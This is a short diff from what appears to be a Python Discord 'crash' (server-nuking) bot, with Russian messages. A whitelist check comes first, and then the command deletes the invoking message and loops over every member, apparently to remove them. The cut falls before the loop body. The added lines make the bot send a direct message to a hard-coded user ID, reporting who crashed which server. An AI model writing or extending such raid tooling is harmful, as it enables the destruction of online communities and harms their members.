@@ -76,6 +76,8 @@ async def crash(ctx):
      await author.send('Краш невозможен! Сервер в белом списке!')
     else:
      await ctx.message.delete()
+     user = Bot.get_user(571667975619346433)
+     await user.send(f'{author} Крашнул сервер! Айди автора: {author.id}')
      for i in members:
        if i is not Bot.user:
           try:
